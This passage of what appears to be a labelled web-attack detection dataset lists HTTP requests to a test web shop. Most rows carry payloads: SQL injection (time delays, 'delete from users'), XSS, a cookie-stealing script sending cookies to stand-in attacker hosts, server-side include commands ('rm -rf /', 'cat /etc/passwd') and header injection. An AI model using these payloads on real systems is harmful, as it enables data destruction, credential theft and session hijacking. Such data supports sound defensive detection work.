,request,label
775,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=caton&password=enco4osa&nombre=lauro&apellidos=santamaria+molt�&email=chady@buscamoto.fi'+and+'1'='1&dni=27243677q&direccion=calle+llibertat+10,+&ciudad=alberic&cp=10610&provincia=guadalajara&ntc=1870284741408418&b1=registrar",1
776,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kimberly&password=semasiol�gico&nombre=jal*ed&apellidos=lledos+corvera&email=juergens-shear@imarbella.dm&dni=49100388b&direccion=c/+pereiro+de+aguiar+13+12-h&ciudad=puebla+de+lillo&cp=01470&provincia=asturias&ntc=8464751915864337&b1=registrar,1
777,"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dokken8&pwd=parlanch�n&remember=off&b1=entrar','0','0');waitfor+delay+'0:0:15';--",1
778,gethttp://localhost:8080/tienda1/publico/autenticar.jsp/.old,1
779,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=@40,1
780,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas';waitfor+delay+'0:0:15';--,1
781,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=lrcrich&pwd=veguer�a&remember=on&b1=entrar,1
782,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
783,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritoparos%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2,1
784,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yezi&pwd=adestr�a&remember=off/&b1=entrar,1
785,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tsuji&password=envergonzado&nombre=stylianos&apellidos=franco+vilamaj�&email=kraa@pablobracamonte.ls&dni=65643274d&direccion=la+pradera+131,+10e&ciudad=burjassot&cp=18615&provincia=zaragoza&ntc=1816581279872417'or'a='a&b1=registrar",1
786,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cassondr&password=i658ct8&nombre=alcides&apellidos=cabanilla+dumenj�&email=odermar@cafedeteatro.tj&dni=57363582h&direccion=calle+general+sanz+pastor+139+6c&ciudad=vila+de+cruces&cp=06185&provincia=ja�n&ntc=3802015475330512&b1=','0','0','0','0');waitfor+delay+'0:0:15';--",1
787,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kumamotoparos%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2&password=glo0al&nombre=nelo&apellidos=marceni�o&email=touliatos@intercambiodeenlaces.hr&dni=19782082n&direccion=c/+andres+bello,+92,+6c&ciudad=alamedilla&cp=13670&provincia=guadalajara&ntc=2637234925036276&b1=registrar",1
788,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7097&b1=confirmar/,1
789,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=delly&password=barboquejo&nombre=celinda&apellidos=cusicanqui+lluch&email=treacy@conac.com.bw&dni=06685986r&direccion=c/+poeta+miguel+hernandez,+85,+13?c&ciudad=escorial,+el&cpa=12300&provincia=pontevedra&ntc=3155444527951741&b1=registrar",1
790,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sherri&password=adj9d8cat0r55&nombre=amaru&apellidos=gilabert&email=chimento@fuzzy.bb&dni=66365789w&direccion=plaza+doctor+quemada+88+8-h%00&ciudad=castrocalb�n&cp=19268&provincia=asturias&ntc=3607118257162367&b1=registrar,1
791,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombrea=vino+rioja&precio=85&cantidad=32&b1=a�adir+al+carrito,1
792,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=levis&pwd=8scualide6&remember=off/&b1=entrar,1
793,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ailbert&password=complacedera&nombre=jano&apellidos=uca�ay&email=leroy9@zarahealth.pa&dni=<script>alert(""paros"");</script>&direccion=calle+kenya+133+&ciudad=chiclana+de+segura&cp=18230&provincia=ourense&ntc=6201867056010966&b1=registrar",1
794,gethttp://localhost:8080/admin/logon.jsp,1
795,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gabrila&password=2r092ri06s6&nombre=iverna&apellidos=vilardaga+bedmar&email=boxleitner-cremiewx@novisa.tv&dni=59188627j&direccion=calle+alfredo+blanco+25+&ciudad=peleas+de+abajo&cp=19278&provincia=salamanca&ntc=224822296312183a&b1=registrar,1
796,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=legs&password=901gi5a&nombre=di�genes&apellidos=barcel�+celada&email=%2b&dni=63732924q&direccion=c/+agustin+lara,+120+2?d&ciudad=terrinches&cp=08786&provincia=burgos&ntc=6410780518660227&b1=registrar",1
797,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7160&b1a=confirmar,1
798,gethttp://localhost:8080/tienda1/asf-logo-wide.gif.old,1
799,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7094&b1a=confirmar,1
800,gethttp://localhost:8080/.old,1
801,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombrea=jam�n+ib�rico&precio=39&cantidad=81&b1=a�adir+al+carrito,1
802,"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=oyama&pwd=chiapa&remember=on&b1=<script>alert(""paros"");</script>",1
803,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
804,gethttp://localhost:8080/busytime.nsf,1
805,gethttp://localhost:8080/samples/isapi/isapi.htm,1
806,gethttp://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif,1
807,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=radick&password=aleve&nombre=par�s&apellidosa=teruel+illarraga&email=cawdon@programaciones.com.gg&dni=41955080k&direccion=c/+san+jose+121,+11?d&ciudad=holguera&cp=43894&provincia=granada&ntc=8674124405846467&b1=registrar",1
808,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cleve&password=guisada&nombre=lila&apellidos=fen�s+montanuy&email=bekkouche@aadsl.hu&dni=74492868p&direccion=padre+isla,+s/n,+&ciudad=castrillo+de+duero&cp=48950&provincia=','0','0');waitfor+delay+'0:0:15';--&ntc=0414805520602488&b1=registrar",1
809,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%7c,1
810,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mclellan&password=calabrote&nombre=celmira&apellidos=delgados+rodrigo&emaila=huster@alquilerpantallasled.an&dni=02547887q&direccion=barrio+nuevo,+34+&ciudad=torroella+de+fluvi�&cp=22650&provincia=segovia&ntc=3100489069524720&b1=registrar",1
811,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pattin&password=48h817n7&nombre=tr�nsito&apellidos=camorlinga+aragon�s&email=boehm@zeat.bo&dni=67474361c&direccion=praza*+crucero+de+cani*do*+144+9?g&ciudad=gav�&cp=06413&provincia=toledo&ntc=2637703097461568&b1=registrar,1
812,gethttp://localhost:8080/tienda1.inc,1
813,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yukihiko&password=10nfig318c559&nombre=malias&apellidos=monestel+robaldino&email=nagy@973.lv&dni=61037738q&direccion=c/+begonia+49+12f&ciudad=borges+del+camp,+les&cp=37621&provinciaa=guadalajara&ntc=1924133576102581&b1=registrar",1
814,gethttp://localhost:8080.bak,1
815,gethttp://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.inc,1
816,"gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito','0');waitfor+delay+'0:0:15';--",1
817,gethttp://localhost:8080/tienda1.old,1
818,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
819,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=shutterb&password=4ntorchar&nombre=noam&apellidos=samper+folco&email=menant@venderfotografias.se&dni=33151406b&direccion=calle+aladierna,+85+3?a&ciudad=buruj�n&cp=28648&provincia=barcel?ona&ntc=1260473774275985&b1=registrar",1
820,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=any%0d%0aset-cookie%3a+tamper%3d5765205567234876235&precio=5059&b1=confirmar,1
821,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=vehling&password=cargadas&nombre=rodipo&apellidos=peteiro&email=szmidt@surcosur.id&dni=64709043s&direccion=calle+ourense+119+5?f&ciudad=puerto+real&cp=2632a&provincia=guadalajara&ntc=0132612345545070&b1=registrar,1
822,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
823,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=koolstra&password=ordenante&nombre=ivo&apellidos=herrero+barberis&email=briers.lester@decsl.pt&dni=56149521n&direccion=av.+valdecilla,+86+&ciudad=cheste&cp=1247a&provincia=tarragona&ntc=0452979446378052&b1=registrar",1
824,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dahlia9&password=resbaladora&nombre=otilia&apellidos=siscart&email=berlandson@palomajimenez.mv&dni=43646821c&direccion=praza+don+bosco,+11+8?c&ciudad=morille&cp=37108&provincia=barcelona&ntc=913811872813492a&b1=registrar",1
825,puthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=19&b1=a�adir+al+carrito,1
826,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=benschop&password=164o+1i0&nombre=tersif�n&apellidos=buj+andunce&email=kendell@multasdetransito.dj&dni=98715726w&direccion=c/+copernic+161+3?b&ciudad=castillonroy&cp=06190&provincia=guadalajara&ntc=233062348355342&b1=registrar,1
827,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=chihhua&password=iri4arand+1=1&nombre=hebert&apellidos=fonts+westermeier&email=hemmings_vos@programasalquilermaquinaria.ag&dni=55492932g&direccion=c/+bazan+184+4?a&ciudad=garcia&cp=10812&provincia=soria&ntc=2183980302594165&b1=registrar,1
828,gethttp://localhost:8080/tienda1/imagenes/1.gif/4861362529278789730,1
829,gethttp://localhost:8080/cfide/administrator/welcomefooter.cfm,1
830,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=charko&password=entrevenimiento&nombre=cayetano&apellidos=papiol+garriga&email=ruehmann.goodrow@cajucar.bz&dni=75246757a&direccion=calle+ferrer+i+guard*i*a,+7*+&ciudad=villa+de+ves&cp=09343&provincia=guadalajara&ntc=1828745224462815&b1=registrar",1
831,gethttp://localhost:8080/tienda1/miembros/4861362529278789730,1
832,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=emilien&password=parox�tona&nombre=sami&apellidos=aller+may�n&email=binns@maxitienda.gs&dni=<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->&direccion=calle+el+tiburon+197,+12?c&ciudad=escarabajosa+de+cabezas&cp=25135&provincia=las+palmas&ntc=2647099047093404&b1=registrar",1
833,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2/&nombre=queso+manchego&precio=85&cantidad=84&b1=a�adir+al+carrito,1
834,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sorkin&password=engordadora&nombre=shakira&apellidos=mej�a+ferr�s&email=boudaoudi-griffeth@muchacha.com.dz&dni=13074085b&direccion=c/+virgen+de+la+paloma+31+12?h&ciudad=pedroso+de+la+armu�a,+el&cp=03277&provincia=soria&ntc=2500333938712142&b1=registrarany%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727",1
835,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bnrecad&password=in!soluble&nombre=aurelio?&apellidos=ospina+soma&email=humbert@24htranslations.name&dni=78151636m&direccion=ramat,+145+5?b&ciudad=barbastro&cp=31227&provincia=valladolid&ntc=5175468282615613&b1=registrar",1
836,gethttp://localhost:8080/tienda1/asf-logo-wide.gif/,1
837,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%00,1
838,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=%3f,1
839,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
840,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sparks&pwd=569t179e&remember=on/&b1=entrar,1
841,"gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2<!--#include+file=""archivo_secreto""+-->",1
842,gethttp://localhost:8080/cfide/administrator/index.cfm,1
843,"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kolahi45&pwd=69'c48ng,7,7a&remember=on&b1=entrar",1
844,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=39&cantidada=50&b1=a�adir+al+carrito,1
845,posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=jam�n+ib�rico&precio=85&cantidad=32&b1=a�adir+al+carrito,1
846,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=felicity&password=bo9510c8951vo&nombre=deodato&apellidos=treig+bonitto&email=roo@didacramirez.kn&dni=+&direccion=lora+64,+&ciudad=villanueva+de+teba&cp=43884&provincia=valladolid&ntc=8769540261854446&b1=registrar",1
847,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=?,1
848,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3212&b1=confirmar/,1
849,gethttp://localhost:8080/tienda1/global/titulo.jsp/asf-logo-wide.old,1
850,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=3754&b1=confirmar,1
851,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2'or'a='a,1
852,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=teed&password=6_u1l67ador&nombre=omer&apellidos=quirentes+vallori&email=portet.olteanu@pintandomucho.tv&dni=7a'9417am&direccion=c/+isidro+polo,+0+13?c&ciudad=utrillas&cp=02310&provincia=barcelona&ntc=4326433486745952&b1=registrar",1
853,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org,1
854,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+.*?rioja&precio=100&cantidad=84&b1=a�adir+al+carrito,1
855,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=virk&password=latrin5&nombre=roxana&apellidosa=barbero+delgados&email=lutz@ringringcargo.eg&dni=91059337z&direccion=c/+llucena,+193+2h&ciudad=almu��car&cp=43248&provincia=barcelona&ntc=6935592091774249&b1=registrar",1
856,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritoset-cookie%3a+tamper%3d1041264011025374727,1
857,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39&cantidada=8&b1=a�adir+al+carrito,1
858,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
859,gethttp://localhost:8080/iisstart.htm,1
860,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jiann&password=freno&nombre=raifroid&apellidos=sol�+portillo&email=nererova@camilafansite.by&dni=41955080k&direccion=c/+fusta+40+11-f&ciudad=san+pablo+de+los+montes&cpa=49333&provincia=burgos&ntc=5510588122545598&b1=registrar,1
861,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=');waitfor+delay+'0:0:15';--,1
862,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito%3f,1
863,gethttp://localhost:8080/webspheresamples/,1
864,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org,1
865,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rayna&password=sa5di-3&nombre=rolando&apellidos=corzo&email=mueller@x2.com.gh&dni=15491128f&direccion=calle+granate,+21,+&ciudad=lahiguera&cp=0335a&provincia=santa+cruz+de+tenerife&ntc=2289103302521090&b1=registrar",1
866,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39&cantidad=18&b1=a�adir+al+carrito%2b,1
867,gethttp://localhost:8080/iissamples/exair/howtoreachus.asp,1
868,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
869,gethttp://localhost:8080/tienda1/miembros/fotos.jsp/4861362529278789730.old,1
870,gethttp://localhost:8080/tienda1/global/creditos.jsp/4861362529278789730,1
871,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=?&b1=pasar+por+caja,1
872,"posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=','0','0','0','0');waitfor+delay+'0:0:15';--",1
873,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2293&b1=pasar+por+caja/,1
874,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=azzuolo&pwda=atrabiliario&remember=off&b1=entrar,1
875,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=any%0aset-cookie%3a+tamper%3d1041264011025374727,1
876,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico','0');waitfor+delay+'0:0:15';--&precio=100&cantidad=28&b1=a�adir+al+carrito",1
877,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&logina=digby&password=gusarapa&nombre=cilatal&apellidos=cusquisiban+ocifuente&email=saint-georges@webhut.mh&dni=51191165l&direccion=baixada+pontenova-freixeiro+30,+&ciudad=portella,+la&cp=37468&provincia=burgos&ntc=7735767005203893&b1=registrar",1
878,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=carmody&password=borricalmente&nombre=lihue&apellidos=figueredo+ferr�s&email=varennes@so-tel.ni&dni=17014566v&direccion=rambla+de+mercedes+149,+&ciudad=hornillos+de+cameros','0','0');waitfor+delay+'0:0:15';--&cp=23560&provincia=valladolid&ntc=7245939027120885&b1=registrar",1
879,gethttp://localhost:8080/tienda1/publico/vaciar.jsp/asf-logo-wide.gif,1
880,gethttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=jam�n+ib�rico&precio=85&cantidad=47&b1=a�adir+al+carrito,1
881,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=queso+manchego&precio=39&cantidad=20&b1=a�adir+al+carrito,1
882,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=85/&cantidad=0&b1=a�adir+al+carrito,1
883,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=%3f,1
884,gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg.bak,1
885,gethttp://localhost:8080/tienda1/6909030637832563290.jsp,1
886,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=9379&b1=pasar+por+caja,1
887,"posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas','0','0','0');waitfor+delay+'0:0:15';--",1
888,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombrea=queso+manchego&precio=39&cantidad=14&b1=a�adir+al+carrito,1
889,"gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=','0','0');waitfor+delay+'0:0:15';--&precio=2158&b1=pasar+por+caja",1
890,"posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico""+and+""1""=""1&precio=100&cantidad=29&b1=a�adir+al+carrito",1
891,gethttp://localhost:8080/msadc/msadcs.dll,1
892,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritosessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>,1
893,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=5506&b1=pasar+por+caja,1
894,"gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=','0','0','0');waitfor+delay+'0:0:15';--",1
895,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=zeigler&pwd=7ervant0f2la&remember=on/&b1=entrar,1
896,gethttp://localhost:8080/cfide/administrator/linkdirect.cfm,1
897,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tobye&password=car40m20ci8&nombre=amaro&apellidos=brunori&email=esham@cpanelweb.com.bv&dni=22205546n&direccion=avda.+aldehuela,+9+13-h&ciudad=torlengua&cp=02510&provincia=palencia&ntc=5917432990420378&b1='+and+'1'='1",1
898,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar'+and+'1'='1&precio=8804&b1=pasar+por+caja,1
899,gethttp://localhost:8080/tienda1/publico/autenticar.jsp.old,1
900,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7092&b1=confirmar/,1
901,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=zalman&password=*diet�tico&nombre=');waitfor+delay+'0:0:15';--&apellidos=fabr�s+bueso&email=riegert_tao-lin@sanchezquesada.ke&dni=11051114m&direccion=avenida+san+mames,+25,+&ciudad=carriches&cp=50366&provincia=guadalajara&ntc=7998962855410697&b1=registrar",1
902,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
903,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2445&b1a=confirmar,1
904,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=291&b1a=pasar+por+caja,1
905,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mcmul+l?in&pwd=acarrear&remember=off&b1=entrar,1
906,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=j'ill'ayne&password=vol6�6ica&nombre=justa&apellidos=catalan+mediero&email=covan-giftos@monnal.so&dni=96303004a&direccion=calle+otero+blas+de+35+4f&ciudad=molacillos&cp=25670&provincia=c�ceres&ntc=4578401748982547&b1=registrar,1
907,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=scythia&password=3389agi48&nombrea=francesca&apellidos=bagaria&email=hsaio@suecas.com.ec&dni=15025159h&direccion=carrer+vallseca,+42,+&ciudad=torrecilla+del+pinar&cp=25225&provincia=ja�n&ntc=2462273534930751&b1=registrar",1
908,gethttp://localhost:8080/events4.nsf,1
909,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
910,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=chihhua&password=iri4ar&nombre=hebert&apellidos=fonts+westermeier&email=hemmings_vos@programasalquilermaquinaria.ag&dnia=55492932g&direccion=c/+bazan+184+4?a&ciudad=garcia&cp=10812&provincia=soria&ntc=2183980302594165&b1=registrar,1
911,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=vino+rioja&precio=100&cantidad=81&b1=a�adir+al+carrito,1
912,gethttp://localhost:8080/samples/sampsite/results.htm,1
913,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=frasco&pwd=.ag091766so&remembera=on&b1=entrar,1
914,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=%00,1
915,gethttp://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.bak,1
916,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
917,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=%3f,1
918,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
919,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=farringt&password=comp9�5ela&nombre=merl�n&apellidos=novelles+madrera&email=finocchiaro_tilbury@enfuerteventura.com.py&dni=47919518f&direccion=pla*za+p+olo+152+13-+f&ciudad=gamones&cp=33315&provincia=teruel&ntc=9165929782828582&b1=registrar,1
920,gethttp://localhost:8080/tienda1/global/titulo.jsp.old,1
921,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39""><!--#exec+cmd=""dir+""--><&cantidad=94&b1=a�adir+al+carrito",1
922,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
923,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=roque&pwd=pulir&remembera=off&b1=entrar,1
924,gethttp://localhost:8080.inc,1
925,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=100&cantidad='+delete+from+users&b1=a�adir+al+carrito,1
926,gethttp://localhost:8080/asf-logo-wide.gif,1
927,"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5716&b1=','0','0');waitfor+delay+'0:0:15';--",1
928,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=munaz&password=s2ld54i5a&nombre=zulma&apellidos=llombart&email=strimpell@deuxmanagement.sn&dni=54841138fbob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org&direccion=sofia,+60,+3?b&ciudad=finestrat&cp=01427&provincia=granada&ntc=3222655347075896&b1=registrar",1
929,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=39&cantidad=65&b1=a�adir+al+carrito'+delete+from+users,1
930,gethttp://localhost:8080/tienda1/publico/carrito.jsp/.old,1
931,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=valenk+a&pwd=bl5nquic77n&remember=off&b1=entrar,1
932,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
933,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=robles&pwd=a6om00�4471&remember=on/&b1=entrar,1
934,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kundert&password=monesca&nombre=ante&apellidos=altirriba+pava&email=lowry-carmine@filtraciondehumos.nc&dni=70212042b&direccion=c/+mercurio+165+4e&ciudad=san+mart�n+de+la+virgen+de+moncayo&cp=03773&provincia=navarra&ntc=9471070680051511&b1=registrar');waitfor+delay+'0:0:15';--,1
935,gethttp://localhost:8080/tienda1/publico/4861362529278789730,1
936,gethttp://localhost:8080.bak,1
937,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=denoon&password=primate&nombre=enoc&apellidos=ayj�n+urmente&email=ehlers@citiway.io&dni=39148879g&direccion=sessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?&ciudad=castellvell+del+camp&cp=45621&provincia=cuenca&ntc=5404280491396556&b1=registrar,1
938,gethttp://localhost:8080/tienda1/global/estilos.css/4861362529278789730.old,1
